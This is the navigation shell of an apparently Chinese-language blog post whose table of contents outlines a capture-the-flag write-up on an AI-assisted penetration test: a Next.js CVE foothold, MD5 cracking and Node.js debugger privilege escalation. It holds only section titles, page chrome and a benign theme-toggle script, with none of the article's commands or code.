rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="41-漏洞分析" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 4.1 漏洞分析 </a><a href="#42-cve-筛选过程" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="42-cve-筛选过程" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 4.2 CVE 筛选过程 </a><a href="#43-exploit" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="43-exploit" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 4.3 Exploit </a><a href="#5-凭据发现与横向移动" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="5-凭据发现与横向移动" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 5. 凭据发现与横向移动 </a><a href="#51-信息收集node-用户" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="51-信息收集node-用户" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 5.1 信息收集（node 用户） </a><a href="#52-md5-破解" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="52-md5-破解" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 5.2 MD5 破解 </a><a href="#53-ssh-登录--user-flag" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="53-ssh-登录--user-flag" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 5.3 SSH 登录 &amp; User Flag </a><a href="#6-权限提升nodejs-inspector-debugger-rce" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="6-权限提升nodejs-inspector-debugger-rce" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 6. 权限提升：Node.js Inspector Debugger RCE </a><a href="#61-关键发现" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="61-关键发现" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 6.1 关键发现 </a><a href="#62-利用" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="62-利用" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 6.2 利用 </a><a href="#63-root-flag" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="63-root-flag" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 6.3 Root Flag </a><a href="#7-attack-graph--ai-agent-的决策树" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="7-attack-graph--ai-agent-的决策树" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 7. Attack Graph —— AI Agent 的决策树 </a><a href="#8-关键-takeaways" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="8-关键-takeaways" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 8. 关键 Takeaways </a><a href="#81-技术层面" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="81-技术层面" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 8.1 技术层面 </a><a href="#82-ai-渗透测试层面" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="82-ai-渗透测试层面" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 8.2 AI 渗透测试层面 </a><a href="#9-flags" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="9-flags" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 9. Flags </a><a href="#10-关于-cairn" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="10-关于-cairn" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 10. 关于 Cairn </a> </div> </nav> </details> <div class="mt-[2rem] hidden flex-1 md:flex md:flex-col" data-astro-cid-zm77yjld> <div class="mb-[1rem] flex items-center gap-[0.75rem]" data-astro-cid-zm77yjld> <div class="flex w-[1rem] flex-col gap-[0.25rem] opacity-60" data-astro-cid-zm77yjld> <span class="h-[0.09375rem] w-[1rem] rounded-full bg-primary" data-astro-cid-zm77yjld></span> <span class="h-[0.09375rem] w-[0.75rem] rounded-full bg-primary" data-astro-cid-zm77yjld></span> <span class="h-[0.09375rem] w-[1rem] rounded-full bg-primary" data-astro-cid-zm77yjld></span> </div> <span class="text-[0.875rem] font-bold tracking-tight text-foreground/90" data-astro-cid-zm77yjld> Table of Contents </span> </div> <nav class="custom-scrollbar max-h-[60vh] overflow-y-auto" data-astro-cid-zm77yjld> <button onclick="document.querySelector('main')?.scrollTo({ top: 0, behavior: 'smooth' })" class="mb-[0.75rem] w-full rounded-[0.75rem] px-[1rem] py-[0.625rem] text-[0.8125rem] font-bold text-foreground/80 transition-all duration-300 hover:bg-primary/5 hover:text-primary" data-astro-cid-zm77yjld>
+↑ Back to Top
+</button> <div class="flex flex-col gap-[0.25rem]" data-astro-cid-zm77yjld> <a href="#1-executive-summary" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="1-executive-summary" data-astro-cid-zm77yjld> 1. Executive Summary </a><a href="#2-侦察与枚举" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="2-侦察与枚举" data-astro-cid-zm77yjld> 2. 侦察与枚举 </a><a href="#21-端口扫描" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="21-端口扫描" data-astro-cid-zm77yjld> 2.1 端口扫描 </a><a href="#22-dns--vhost-枚举" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="22-dns--vhost-枚举" data-astro-cid-zm77yjld> 2.2 DNS / VHost 枚举 </a><a href="#23-web-应用深度分析" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="23-web-应用深度分析" data-astro-cid-zm77yjld> 2.3 Web 应用深度分析 </a><a href="#3-方向纠正从-ssh-爆破到-nextjs-cve" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="3-方向纠正从-ssh-爆破到-nextjs-cve" data-astro-cid-zm77yjld> 3. 方向纠正：从 SSH 爆破到 Next.js CVE </a><a href="#31-死胡同" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="31-死胡同" data-astro-cid-zm77yjld> 3.1 死胡同 </a><a href="#32-hint-注入人机协作的威力" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="32-hint-注入人机协作的威力" data-astro-cid-zm77yjld> 3.2 Hint 注入——人机协作的威力 </a><a href="#4-foothold-cve-2025-66478-react2shell" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="4-foothold-cve-2025-66478-react2shell" data-astro-cid-zm77yjld> 4. Foothold: CVE-2025-66478 (React2Shell) </a><a href="#41-漏洞分析" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="41-漏洞分析" data-astro-cid-zm77yjld> 4.1 漏洞分析 </a><a href="#42-cve-筛选过程" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="42-cve-筛选过程" data-astro-cid-zm77yjld> 4.2 CVE 筛选过程 </a><a href="#43-exploit" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="43-exploit" data-astro-cid-zm77yjld> 4.3 Exploit </a><a href="#5-凭据发现与横向移动" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="5-凭据发现与横向移动" data-astro-cid-zm77yjld> 5. 凭据发现与横向移动 </a><a href="#51-信息收集node-用户" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="51-信息收集node-用户" data-astro-cid-zm77yjld> 5.1 信息收集（node 用户） </a><a href="#52-md5-破解" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="52-md5-破解" data-astro-cid-zm77yjld> 5.2 MD5 破解 </a><a href="#53-ssh-登录--user-flag" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="53-ssh-登录--user-flag" data-astro-cid-zm77yjld> 5.3 SSH 登录 &amp; User Flag </a><a href="#6-权限提升nodejs-inspector-debugger-rce" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="6-权限提升nodejs-inspector-debugger-rce" data-astro-cid-zm77yjld> 6. 权限提升：Node.js Inspector Debugger RCE </a><a href="#61-关键发现" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="61-关键发现" data-astro-cid-zm77yjld> 6.1 关键发现 </a><a href="#62-利用" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="62-利用" data-astro-cid-zm77yjld> 6.2 利用 </a><a href="#63-root-flag" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="63-root-flag" data-astro-cid-zm77yjld> 6.3 Root Flag </a><a href="#7-attack-graph--ai-agent-的决策树" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="7-attack-graph--ai-agent-的决策树" data-astro-cid-zm77yjld> 7. Attack Graph —— AI Agent 的决策树 </a><a href="#8-关键-takeaways" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="8-关键-takeaways" data-astro-cid-zm77yjld> 8. 关键 Takeaways </a><a href="#81-技术层面" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="81-技术层面" data-astro-cid-zm77yjld> 8.1 技术层面 </a><a href="#82-ai-渗透测试层面" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="82-ai-渗透测试层面" data-astro-cid-zm77yjld> 8.2 AI 渗透测试层面 </a><a href="#9-flags" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="9-flags" data-astro-cid-zm77yjld> 9. Flags </a><a href="#10-关于-cairn" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="10-关于-cairn" data-astro-cid-zm77yjld> 10. 关于 Cairn </a> </div> </nav> </div>  <!-- Reencrypt Button -->  <!-- Bottom Section --> <div class="mt-[2rem] border-t border-border/50 pt-[2rem] md:mt-auto md:border-t-0" data-astro-cid-zm77yjld> <a href="/posts" class="group mb-[1.5rem] flex items-center gap-[0.5rem] text-[0.875rem] text-muted-foreground hover:text-primary" data-astro-cid-zm77yjld> <span class="transition-transform group-hover:-translate-x-1" data-astro-cid-zm77yjld> <svg width="0.875rem" height="0.875rem" data-astro-cid-zm77yjld="true" data-icon="mdi:arrow-left">   <symbol id="ai:mdi:arrow-left" viewBox="0 0 24 24"><path fill="currentColor" d="M20 11v2H8l5.5 5.5l-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5L8 11z"/></symbol><use href="#ai:mdi:arrow-left"></use>  </svg> </span> Back to posts </a> <div class="flex items-center justify-between" data-astro-cid-zm77yjld> <div class="flex gap-[1rem] text-muted-foreground/80" data-astro-cid-zm77yjld> <a href="https://github.com/n0nome" class="cursor-pointer transition-colors hover:text-primary" aria-label="GitHub" data-astro-cid-zm77yjld> <svg width="1.25rem" height="1.25rem" data-astro-cid-zm77yjld="true" data-icon="mdi:github">   <symbol id="ai:mdi:github" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2A10 10 0 0 0 2 12c0 4.42 2.87 8.17 6.84 9.5c.5.08.66-.23.66-.5v-1.69c-2.77.6-3.36-1.34-3.36-1.34c-.46-1.16-1.11-1.47-1.11-1.47c-.91-.62.07-.6.07-.6c1 .07 1.53 1.03 1.53 1.03c.87 1.52 2.34 1.07 2.91.83c.09-.65.35-1.09.63-1.34c-2.22-.25-4.55-1.11-4.55-4.92c0-1.11.38-2 1.03-2.71c-.1-.25-.45-1.29.1-2.64c0 0 .84-.27 2.75 1.02c.79-.22 1.65-.33 2.5-.33s1.71.11 2.5.33c1.91-1.29 2.75-1.02 2.75-1.02c.55 1.35.2 2.39.1 2.64c.65.71 1.03 1.6 1.03 2.71c0 3.82-2.34 4.66-4.57 4.91c.36.31.69.92.69 1.85V21c0 .27.16.59.67.5C19.14 20.16 22 16.42 22 12A10 10 0 0 0 12 2"/></symbol><use href="#ai:mdi:github"></use>  </svg> </a><a href="ejgreen.wansh@gmail.com" class="cursor-pointer transition-colors hover:text-primary" aria-label="Email" data-astro-cid-zm77yjld> <svg width="1.25rem" height="1.25rem" data-astro-cid-zm77yjld="true" data-icon="mdi:email">   <symbol id="ai:mdi:email" viewBox="0 0 24 24"><path fill="currentColor" d="m20 8l-8 5l-8-5V6l8 5l8-5m0-2H4c-1.11 0-2 .89-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2"/></symbol><use href="#ai:mdi:email"></use>  </svg> </a> </div> <button id="theme-toggle" class="relative flex h-6 w-10 items-center rounded-full bg-muted p-1" title="theme toggle"> <div class="h-4 w-4 translate-x-0 rounded-full bg-background shadow-sm dark:translate-x-4"></div> </button> <script>
+  function applyTheme() {
+    const theme = (() => {
+      const localStorageTheme = localStorage?.getItem("theme") ?? "";
+      if (["dark", "light"].includes(localStorageTheme)) {
+        return localStorageTheme;
+      }
+      if (window.matchMedia("(prefers-color-scheme: dark)").matches) {
+        return "dark";
+      }
+      return "light";
+    })();
+
+    if (theme === "light") {
+      document.documentElement.classList.remove("dark");
+    } else {
+      document.documentElement.classList.add("dark");
+    }
+
+    window.localStorage.setItem("theme", theme || "dark");
+  }
+
+  function attachThemeToggleListeners() {
+    const handleToggleClick = () => {
+      const element = document.documentElement;
+      element.classList.toggle("dark");
+
+      const isDark = element.classList.contains("dark");
+      localStorage.setItem("theme", isDark ? "dark" : "light");
+    };
+
+    // 获取所有 theme-toggle 按钮并移除旧的监听器
+    document.querySelectorAll("#theme-toggle").forEach((button) => {
+      // 克隆节点以移除所有旧的事件监听器
+      const newButton = button.cloneNode(true);
+      button.parentNode.replaceChild(newButton, button);
+
+      // 添加新的事件监听器
+      newButton.addEventListener("click", handleToggleClick);
+    });
+  }
+
+  function initThemeToggle() {
+    applyTheme();
+    attachThemeToggleListeners();
+  }
+
+  // 页面加载时初始化
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", initThemeToggle);
+  } else {
+    initThemeToggle();
+  }
+
+  // 页面切换时只重新应用主题和监听器
+  document.addEventListener("astro:after-swap", initThemeToggle);
+</script> </div> </div> </aside> </div>  <script defer></script> </body></html> <script type="module" src="/_astro/ArticleLayout.astro_astro_type_script_index_0_lang.DBzzbuGd.js"></script>  
